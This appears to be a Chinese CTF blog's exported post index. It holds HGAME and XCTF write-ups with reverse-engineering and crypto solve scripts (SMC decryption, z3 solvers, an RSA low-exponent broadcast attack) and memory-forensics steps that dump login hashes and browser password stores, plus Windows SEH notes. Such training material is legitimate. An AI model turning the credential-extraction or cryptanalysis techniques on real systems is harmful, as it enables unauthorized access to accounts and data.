Re1.FAKE​ 拖到ida ​ 关键函数里有36个方程，36个变量，那就不可能普通的解出来， ​ 查找字符串得到提示 Try angr or z3，我用的是 z3库，脚本太长了就不放了（用z3库解的时候一直跑不出结果，就去问了 r3n0学长，学长说可能需要点时间，但之后我重新弄了一下add的部分很快就跑出来了，应该是我自己中间操作上的问题….） ​ 假flag，查一下SMC 1SMC(self-Modifying Code)，就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。 ​ 在ida里找一下smc自解密的部分 ​ 这段代码执行后才得到真正的代码，写 idc 脚本来解密 ida 反编译后错误的代码 123456789101112#include &lt;idc.idc&gt;static main(){ auto addr = 0x00401216; //函数地址 auto addr2 = 0x00409080; //byte数组地址 auto i = 0; for(i=0;i&lt;=0x43E;i++) { PatchByte(addr+i,Byte(addr+i)^Byte(addr2+i)); }} ​ 得到运行过程中真正的代码 ​ 这部分继续用z3库写脚本去解 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from z3 import *s = Solver()a1 = [0] * 36for i in range(36): a1[i] = Int('a1[' + str(i) + ']')v3 = [0]*36v2 = [0]*36v4 = [0]*36v3[0] = 55030v3[1] = 61095v3[2] = 60151v3[3] = 57247v3[4] = 56780v3[5] = 55726v3[6] = 46642v3[7] = 52931v3[8] = 53580v3[9] = 50437v3[10] = 50062v3[11] = 44186v3[12] = 44909v3[13] = 46490v3[14] = 46024v3[15] = 44347v3[16] = 43850v3[17] = 44368v3[18] = 54990v3[19] = 61884v3[20] = 61202v3[21] = 58139v3[22] = 57730v3[23] = 54964v3[24] = 48849v3[25] = 51026v3[26] = 49629v3[27] = 48219v3[28] = 47904v3[29] = 50823v3[30] = 46596v3[31] = 50517v3[32] = 48421v3[33] = 46143v3[34] = 46102v3[35] = 46744v2[0] = 104v2[1] = 103v2[2] = 97v2[3] = 109v2[4] = 101v2[5] = 123v2[6] = 64v2[7] = 95v2[8] = 70v2[9] = 65v2[10] = 75v2[11] = 69v2[12] = 95v2[13] = 102v2[14] = 108v2[15] = 97v2[16] = 103v2[17] = 33v2[18] = 45v2[19] = 100v2[20] = 111v2[21] = 95v2[22] = 89v2[23] = 48v2[24] = 117v2[25] = 95v2[26] = 107v2[27] = 111v2[28] = 110v2[29] = 119v2[30] = 95v2[31] = 83v2[32] = 77v2[33] = 67v2[34] = 63v2[35] = 125for i in range(0,6): for j in range(0,6): for k in range(0,6): v4[6 * i + j] += v2[6 * k + j] * a1[6 * i + k]for i in range(0,6): for j in range(0,6): s.add(v4[6*i+j] == v3[6 * i + j])s.check()result = s.model()for i in range(0, 36): print(result[a1[i]], end=' ') Crypto1.LikiPrime​ 还是 RSA，不过素数 N 更大了，但是放到网站里分解还是能分解出 q和 p，之后就是用上周的脚本跑出flag 2.HappyNewYear!!​ e = 3，发送内容相同，自然就想到低指数广播攻击，但是广播攻击只需要 e组数据，那么猜测给的数据里解出来的明文不是全部相同。 ​ 低指数广播攻击需要用到中国剩余定理（孙子定理），脚本如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344from libnum import n2simport gmpy2from functools import reducedef modinv(a, m): return int(gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m)))def chinese_remainder(n, a): sum = 0 prod = reduce(lambda a, b: a * b, n) for n_i, a_i in zip(n, a): p = prod // n_i sum += a_i * modinv(p, n_i) * p return int(sum % prod)n1 = c1 = n2 = c2 = n3 = c3 = n4 = c4 = n5 = c5 =n6 = c6 = n7 = c7 = nset = [n2,n4,n6]cset = [c2,c4,c6]m = chinese_remainder(nset, cset)m = gmpy2.iroot(m,3)m = int(m[0])print(n2s(m)) c1,c3,c5 解密得到一个片段，c2,c4,c6解密得到剩下的flag片段（本来写的是随机在给出的7组数据里挑三组解密，但是没跑出结果，后来手动试了一下试出来了） Misc1.A R K​ 打开下载的流量包，首先看到dns里的域名 ​ 刚开始以为跟网址有关，但后来题目里说 “本题目所有解题操作均只用流量，与网址无关” ，那就接着看其他包，查资料知道 TLS 加密尝试找到流量包里的证书 ​ 导出原始数据保存为 ssl.log ,再重新导入解密 ​ 找到解密后的 HTTP 流，导出后得到一堆json文件，导出来后卡了一段时间，之后看到题目的补充信息 ​ 补充说明：明日方舟是一款塔防游戏，可以将可部署单位放置在场地中。并且具有自律功能，可以记录部署的操作。 翻译：没用 没用 出题人用可部署单位画了个东西 背景是白色的 ​ 记录部署操作？！那就打开 getBattleReplay 文件，看到像是 base64 编码的字符串，解码看到 zip 文件头标识另存为 zip，解压打开发现配对的 row 和 col ，应该是部署的坐标，再根据题目里的 画了个东西 猜测这些坐标是二维码黑色部分，处理一下再运行脚本 ​ 扫码得flag 2.A R C​ 压缩包加密了，那就先看图片找密码 ​ 刚开始误以为 BV 是某种 CTF 中的加密方式，在网上搜索了一圈没有收获，于是去问 Akira 学长 BV 除了 b站BV号还有什么意思，学长的答复是 ​ 怎么实现的？查 av号怎样转 bv号后发现 https://www.zhihu.com/question/381784377/answer/1099438784 这个回答里的实现方法，根据 hint1：8558 应该理解成85和58，BV号_是所以图片里的是__ 先对图里的密文进行 base85 解密 ​ 根据长度判断应该是 av号转 bv号算法里的table，那就换一下上面链接里代码的table，密文是压缩包名里的数字，跑一下得到压缩包密码 ​ 打开后得到一段 arc 视频和密文，用题目里给的软件播放视频得到 ​ 发现图中第一行文字和文本里文字相似，猜测是同种加密方式，之后又没有思路了，hint2里提到 词频分析是个好东西，别忘了视频里的问题 ，查了下视频里的问题但没什么发现。后来又放出hint 用了某种ROT的范围，但是位移不一样 ，根据两个字符的应该是 is 之类的尝试将每个字符后移10位，得到了一段英文，然后又卡住了。于是又去问 Akira学长，学长说并不是后移10位提示我再想想视频里问题的答案，突然想起之前有查到 42 这个数字，尝试后移42位得到正确的文字 ​ 视频里文字第一行也是后移 42位得到 MSU 密码，解密得到的文字里提到视频里第二行的加密方法 Liki学长提到过，根据 week1 crypto的第一题，第二行文字加密方法应该是维吉尼亚，密钥是 Akira ​ 在 virtualDub2里安装MSUstego插件，用之前得到的密码对视频进行解密，得到网址、光和对立的名字，访问网站输入用户名和密码 ​ 根据hint5: / 不是可输入的意思，是网站路径，想起之前视频解出的第二行还没用上，那就在网站路径后输入解出的明文，得到flag（pm） ​ 这周misc虽然难但很有趣，梗挺多的 总结：​ 这周因为跟父母回老家拜年少了很多做题的时间，之后电脑还出了故障重装了系统，下周要专注于re了，不能再靠着 misc 和 crypto 上分了 接下来是没做出来的部分 re​ Gun这道题用查壳工具查得是梆梆免费版加固，想要脱壳，用了很多网上查到的方法但都失败了，问了 Trotsky学长，推荐使用frida-dexdump脱壳，但是因为这道题需要root过的真机（模拟器不行）来进行脱壳，所以最后只能放弃 ​ hello_re3我没太搞明白，拖进ida发现应该都是调试信息，mezone学长说要用dbgview看调试信息再定位到程序里，可惜这题是最后一天才做的，最后没时间了，打算看官方writeup再学习一下 Crypto​ EncryptedChats这题尝试了各种方法去解，还是解不出 a 和 b ，需要的时间都很长，但是 g 挺大（不是2、5这种很小的） a 跟 b 应该是能解出来的…","link":"/2021/03/27/HGAME-Week3-Writeup/"},{"title":"HGAME-Week4-Writeup","text":"week4 Re1.vm​ 这部分逻辑很清晰，重点在中间这个加密的部分，点进去查看这个函数发现 switch-case 应该是vm，每个case都是一个 opcode ​ 题目里说 ovm++ hates debugger ，那就先调试一下，调试后可以猜测出具体的加密部分 ​ 输入的 flag 先是经过异或加密，之后又有减法操作，加密后与密文进行比较，写脚本解一下就能得到 flag 12345678910111213cipher = [0xcf,0xbf,0x80,0x3b,0xf6,0xaf,0x7e,0x02,0x24,0xed,0x70,0x3a,0xf4,0xeb,0x7a,0x4a,0xe7,0xf7,0xa2,0x67,0x17,0xf0,0xc6,0x76,0x36,0xe8,0xad,0x82,0x2e,0xdb,0xb7,0x4f,0xe6,0x09]table1 = [0xFE,0x21,0x44,0x67,0x8A,0xAD,0xD0,0xF3,0x16,0x39,0x5c,0x7f,0xa2,0xc5,0xe8,0x0b,0x2e,0x51,0x74,0x97,0xba,0xdd,0x00,0x23,0x46,0x69,0x8c,0xaf,0xd2,0xf5,0x18,0x3b,0x5e,0x81]table2 = [0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a,0xba,0x5a,0xfa,0x9a,0x3a,0xda,0x7a,0x1a]for i in range(34): if cipher[i] + table2[33-i] &lt; 256: cipher[i] += table2[33-i] else: cipher[i] = cipher[i] + table2[33-i] - 256for i in range(34): cipher[i] ^= table1[33-i] print(chr(cipher[i]),end = &quot;&quot;) ​ 这道题标准解法应该不是这样解的，而是要先要翻译出对应的汇编代码再分析，但这部分我还不太明白之后再补上吧 2.A 5 Second Challenge​ 这题要感谢小圆学长的耐心回答!! ​ 下载得到的是用unity制作的扫雷游戏，刚开始为了获得源码用 il2cppdumper 处理 GameAssembly.dll ，但发现处理后得到的不全，之后问了一下小圆学长发现源码已经给了。 ​ 打开 AFiveSecondChallenge.cpp ，源码里有 getUnixtime 这类获取时间的函数，游戏时间超过 5s 就会显示超时，用锁住系统时间的软件可以避开这一检测。锁定时间后就可以开始玩扫雷，几局下来后会发现雷的位置能构成二维码 ​ 根据题目提示，把 managed 文件夹下的 dll 拖到 ida 里，会发现有一个函数被nop掉了，定位到源码里查看（il2cpp的中间文件有些混乱，删除了影响判断的部分） ​ 这里的 return 判断是否是雷的位置，本来分析到这里已经很清楚了但是因为我完全不懂类和方法什么的看了挺久 ​ GetAt函数的返回值没在源码里看到有初始赋值于是迷惑了好久，又去问了一下小圆学长这部分是在哪里初始化过，得到回复说是在那个 dll 里面。 ​ 但是我在我下载的东西里面没发现 m_Items 初始化的部分，去网站上重新下载并拖到 ilspy ，得到了这个数组里的值 ​ 接下来就是写脚本解题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;stdio.h&gt;#include&lt;math.h&gt;double matrix[45][15][3] = ;double GetAt(i, j, k){ int iBound = 45; //45 int jBound = 15; //15 int kBound = 3; //3 return matrix[i][j][k];}int main(){ int y,x; FILE* fp; fp = fopen(&quot;************&quot; , &quot;w&quot;); int a[45][45]; int i, j; for (y = 0; y &lt; 45; y++) { for (x = 0; x &lt; 45; x++) { double L_8 = GetAt(y, x / 3, 0); double L_14 = GetAt(y, x / 3, 1); double V_0 = L_14; double L_20 = GetAt(y, x / 3, 2); double V_1 = L_20; double V_2 = fmod(x, 3.0f) - 1.0f; a[x][y] = L_8* V_2* V_2 + V_0 * V_2 + V_1 &gt; 0.0 ? 1 : 0; //1是雷 } } for (i = 0; i &lt; 45; i++) { for (j = 0; j &lt; 45; j++) { printf(&quot;%d&quot;, a[j][i]); if (a[j][i] == 1) fprintf(fp, &quot;%d,%d\\n&quot;, j, i); } printf(&quot;\\n&quot;); } fclose(fp); return 0;} 123456import matplotlib.pyplot as pltimport numpy as npx,y = np.loadtxt('./xy.txt',delimiter=',',unpack=True)plt.plot(x,y,'.')plt.show() 3.nllvm​ 拖到 ida 里发现挺乱的，也没看到控制台输出的那些文字，那就先调试看看 ​ 调试后发现这些异或操作得到的就是控制台输出的字符，在输出后又来了一遍异或还原。 ​ 接着调试发现判断输入字符串的地方 ​ 这一部分异或得到 “CryptoFAILUREforRSA2048Key!!!!!!” 这个字符串，接着来到加密的函数 ​ 传入的就是这部分异或得到字符串和输入的 flag，之后看了一下这个函数里面是一些比较复杂的运算猜测是某种算法，我对各种算法不是很熟所以用了 ida 插件 findcrypt ，但是这个插件并没有找到什么算法于是我就去找学长确认了一下 ​ 查了各种算法，最后发现加密函数里面的一个函数像是s盒，根据s盒数字判断又是 AES 加密 ( s盒也是异或得到的，这大概是插件检测不出算法的原因 ) ​ 在调试过程中可以知道 iv值是 123456789abcdef ，判断是否为正确 flag 的部分与密文进行比较，改变了输出字符的外观（表示是否回到现实） ​ 之后用我在week2写的脚本解就行 ​ 查了一下题目里的 llvm ，是一款代码混淆器，具体的是看了这篇文章https://bbs.pediy.com/thread-224484.htm Misc1.Akira之瞳-1​ 查资料知道这种 dump 出来的RAW 文件要在 linux 里用 volatility 看，先查一下系统版本 ​ 接着用 pslist 查看一下系统进程，找到可疑的进程后 dump 出来 ​ 用 foremost 分离出一个加密的压缩包，本来以为密码还在 raw 文件里面的某个文件里来回看了好多遍，之后用 010editor 打开压缩包后发现提示，zip 密码是系统登陆密码 ​ hashdump 一下得到登陆密码的 hash 值 ​ 按提示把密码解出来 ​ 打开压缩包后发现两张图片，名字是src 和 blind，很容易就想到盲水印，用这个工具 (https://github.com/chishaxie/BlindWaterMark) 提取出水印 ​ 图片里小写的 L 是数字1 2.Akira之瞳-2​ 得到一个加密压缩包和 RAW 文件，同样先查看一下进程，发现 notepad进程 dump出来 ​ 在 dump 出来的进程里查一下 password 字符串，得到 zip 密码 ​ 打开压缩包得到 ​ 这几个文件名好像在哪里见过，翻了一下往年的 writeup 知道container 是加密容器，cookies 是chrome浏览器的 cookie 数据库。但是看 cookies 文件内容和打开加密卷都需要密码，回到 linux 里再查一下有无密码，因为是 notepad 进程那就查 txt 文件 ​ 这个 dumpme.txt 很可疑，提取出来发现之前 zip 密码还有后半句。百度一下知道 lastpass 是 chrome 浏览器的插件，用来记录密码的，把 lastpass 和 dump 放在一起搜索找到 volatility 里有 lastpass 这个插件 ​ 得到一个密码，下载 ChromeCookiesView ，加载 cookies 文件并输入密码，得到加密容器密码并提示用 VeraCrypt 打开 ​ 打开虚拟分区得到一张图片，查 ADS 得知 NTFS 隐写 ​ NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。 ​ 然后用 Ntfs Streams Editor 这个软件查看 ADS 流文件，得到 flag ​ 那个网址里的图是 Akira 学长的新头像 总结​ 为时四周的 hgme 要结束了，这个寒假学到了很多东西过得很充实，希望以后能继续学习这方面的知识，不断进步","link":"/2021/03/27/HGAME-Week4-Writeup/"},{"title":"windows 异常处理","text":"简单总结一下有关 Windows 处理异常方面的知识 SEHSEH 简单说明​ SEH是基于栈的异常处理，作用范围仅限当前线程，在程序产生异常时，如果程序正在被调试os 就会先把异常抛给调试器处理 ，调试器无法解决这一异常就会由进程处理，进程也无法处理就会交由 os 处理。 SEH 结构TEB 结构体​ TEB 结构体是操作系统为了保存线程私有数据而创建的，TIB 是保存线程基本信息的数据结构。 ​ 在 x86 用户模式下可以由 FS 寄存器来访问当前线程 TEB数据，64位系统中则使用 gs 寄存器 SEH 的链式结构​ SEH 以链的形式存在，即链表，结构如图所示： ​ SEH 会在链表的头部进行异常处理函数的安装与卸载 TEB.NtTib.ExceptionList = FS:[0] ExceptionList 是 TIB 中与异常处理有关的项，指向 SEH 链 安装与卸载 安装 push @MyHandler ;异常处理程序push FS:[0] ；SEH Linked List头mov dword ptr fs:[0],esp ;添加链表 卸载 mov esp,dword ptr fs:[0]pop dword ptr fs:[0] ​ 安装与卸载一般发生在函数开始与结束处 VEH​ 当异常发生时，VEH 会在 SEH 之前执行，如果 VEH 无法处理这一异常，就会由 SEH 继续处理异常 ​ 可通过 AddVectorExceptionHandler 这个 API 来注册回调函数，第一个参数可指定回调函数安装与卸载是在链表前端还是尾部 ​ 作用范围为整个进程，可捕获所有线程的异常 ​ 想要获取 VEH 异常的函数地址应该可以看程序中是否用到 AddVectorExceptionHandler 这个 API，第二个参数是异常处理函数 例子​ minilctf re2 ​ 这里存在两个触发异常的点，一个是访问到了不能访问的内存，另一个是除0异常 ​ 在 main 函数的开头发现异常处理函数安装的汇编代码，但调试过程中在 __except_handler4 下断点程序并不会停下，这里的 __except_handler4 里的函数应该是编译器添加的 ​ 在 TLS 函数中可以发现注册了 VEH 的异常处理程序，根据 VEH 会先于 SEH 执行，在 Handler 函数下断就能使指定的异常触发时停下 ​ 当然有关 Windows 异常处理的知识还有很多，本文没有提到，待填 参考资料 《加密与解密》 《逆向工程核心原理》 SEH详解 AddVectoredExceptionHandler 获取VEH SEH VCH UEF异常的函数地址 VEH分析 Windows调试艺术——从0开始的异常处理（下）","link":"/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"title":"XCTF Final: Spaceship","text":"对 Xctf Final Re 题： SpaceShip 的复现 初步分析​ 下载得到 ws 后缀的文件 ，谷歌查 ws 后缀文件 ​ 不过这不对，根据文件内只有空格、换行符等以及比赛时队友找到 的资料，应该是 WhiteSpace 语言 ​ 用工具可以把这个语言转成 python 和汇编形式 ​ https://github.com/Smithers888/BlueSpace 调试​ 转换得到的 python 文件可以直接运行，所以可以直接调试看逻辑 123456789101112131415161718192021222324252627282930313233343536def stssstttsttn(): stack.append(0) sys.stdout.flush() try: x = ord(sys.stdin.read(1)) except EOFError: x = -1 #x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x11,x12,x13,x14,x15,x16,x17,x18 = Ints('x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18') heap[stack.pop()] = x #调试时改动 stack.append(0) stack.append(0) stack[-1] = heap[stack[-1]] stack.append(16777216) x = stack.pop() stack[-1] += x stack.append(16777216) x = stack.pop() stack[-1] %= x x = stack.pop() ......... stack.append(0) stack[-1] = heap[stack[-1]] stack.append(1) stack[-1] = heap[stack[-1]] x = stack.pop() stack[-1] -= x try: if stack.pop() &lt; 0: return sttsssttssstn except Z3Exception: #异常 print(stack,heap) ​ 这部分读取并对输入进行运算，从下面这些数字猜测进行了方程的 运算 ​ 根据学长的思路可以把输入都转换成 z3 里的符号，那么在之后判 断大小的时候会因为符号不能比大小而抛出异常，就可以打印出表达式（这做法太灵活了，自己根本想不到…） 1234567891011121314151617181920212223242516777089: ((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251, 16777086: 11, 16777085: ((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#堆的数据heap ={0: 10 1: 446 2: 0, 3: 16777074 4: 16777077 5: 16777076 6: 0 8: 2 9: 10 10: 10 11: 8 12: 3 13: 11 14: 1753 15: 7 16: 17 17: 6 18: 4 19: 8 20: 16 21: 2117 22: 4 23: 5 24: 3 25: 15 26: 6 27: 6 28: 1071 29: 3 30: 17 31: 5 32: 4 33: 2 34: 16 35: 1116 36: 10 37: 14 38: 4 39: 0 40: 10 41: 9 42: 2190 43: 9 44: 14 45: 4 46: 0 47: 4 48: 9 49: 1764 50: 2 51: 3 52: 1 53: 2 54: 3 55: 1 56: 617 57: 9 58: 14 59: 8 60: 0 61: 3 62: 9 63: 2193 64: 1 65: 17 66: 5 67: 4 68: 2 69: 16 70: 866 71: 8 72: 5 73: 2 74: 15 75: 8 76: 6 77: 1594 78: 5 79: 12 80: 10 81: 13 82: 2 83: 7 84: 1153 85: 10 86: 12 87: 5 88: 13 89: 8 90: 7 91: 1737 92: 5 93: 12 94: 9 95: 13 96: 9 97: 7 98: 1445 99: 4 100: 10 101: 7 102: 8 103: 7 104: 11 105: 2119 106: 5 107: 3 108: 2 109: 2 110: 5 111: 1 112: 1237 113: 9 114: 5 115: 8 116: 15 117: 4 118: 6 119: 1463 120: 7 121: 10 122: 8 123: 8 124: 4 125: 11 126: 2217 127: 6 128: 3 129: 10 130: 2 131: 1 132: 1 133: 1871} ​ 对照着可以发现 18 个表达式的形式 exp12345678910111213((((((0 + (2*((x10 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (10*((x8 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)% 3251 + (3*((x11 + 16777216)%16777216) + 16777216)%16777216 + 16777216)% 16777216)%3251 ​ 因为每个变量都在可见字符范围内，所以上面的表达式可以简化成 12*x10+10*x8+3*x11== 1234567891011121314151617from z3 import *heap = {0: 10, 1: 446, 2: 0, 3: 16777074, 4: 16777077, 5: 16777076, 6: 0, 8: 2, 9: 10, 10: 10, 11: 8, 12: 3, 13: 11, 14: 1753, 15: 7, 16: 17, 17: 6, 18: 4, 19: 8, 20: 16, 21: 2117, 22: 4, 23: 5, 24: 3, 25: 15, 26: 6, 27: 6, 28: 1071, 29: 3, 30: 17, 31: 5, 32: 4, 33: 2, 34: 16, 35: 1116, 36: 10, 37: 14, 38: 4, 39: 0, 40: 10, 41: 9, 42: 2190, 43: 9, 44: 14, 45: 4, 46: 0, 47: 4, 48: 9, 49: 1764, 50: 2, 51: 3, 52: 1, 53: 2, 54: 3, 55: 1, 56: 617, 57: 9, 58: 14, 59: 8, 60: 0, 61: 3, 62: 9, 63: 2193, 64: 1, 65: 17, 66: 5, 67: 4, 68: 2, 69: 16, 70: 866, 71: 8, 72: 5, 73: 2, 74: 15, 75: 8, 76: 6, 77: 1594, 78: 5, 79: 12, 80: 10, 81: 13, 82: 2, 83: 7, 84: 1153, 85: 10, 86: 12, 87: 5, 88: 13, 89: 8, 90: 7, 91: 1737, 92: 5, 93: 12, 94: 9, 95: 13, 96: 9, 97: 7, 98: 1445, 99: 4, 100: 10, 101: 7, 102: 8, 103: 7, 104: 11, 105: 2119, 106: 5, 107: 3, 108: 2, 109: 2, 110: 5, 111: 1, 112: 1237, 113: 9, 114: 5, 115: 8, 116: 15, 117: 4, 118: 6, 119: 1463, 120: 7, 121: 10, 122: 8, 123: 8, 124: 4, 125: 11, 126: 2217, 127: 6, 128: 3, 129: 10, 130: 2, 131: 1, 132: 1, 133: 1871}s=Solver()x=IntVector('x',18)for i in range(8,7*18+8,7): s.add(heap[i]*(x[heap[i+1]]) +heap[i+2]*(x[heap[i+3]]) +heap[i+4]*(x[heap[i+5]])==heap[i+6]) print(s.check())print(s.model())ans=s.model()x10,x8,x11=Ints('x10 x8 x11')[print(chr(int(str(ans[i]))),end='') for i in x]#xctf{Wh1t3sym3x!?} ​ ​ 复现得到 flag 后还在谷歌上找到了有人在赛时写了个类似 angr 的对 whitespace 自动求解的 库，有空再研究 ​ https://github.com/umutoztunc/whitesymex 参考资料 https://zh.wikipedia.org/wiki/Whitespace https://pypi.org/project/whitesymex/ https://github.com/umutoztunc/whitesymex https://github.com/Smithers888/BlueSpace Vidar-Team writeup","link":"/2021/06/02/XCTF-Final-Spaceship/"}],"tags":[{"name":"re","slug":"re","link":"/tags/re/"},{"name":"wp","slug":"wp","link":"/tags/wp/"},{"name":"hgame","slug":"hgame","link":"/tags/hgame/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"windows","slug":"windows","link":"/tags/windows/"}],"categories":[{"name":"Hgame2021","slug":"Hgame2021","link":"/categories/Hgame2021/"}]}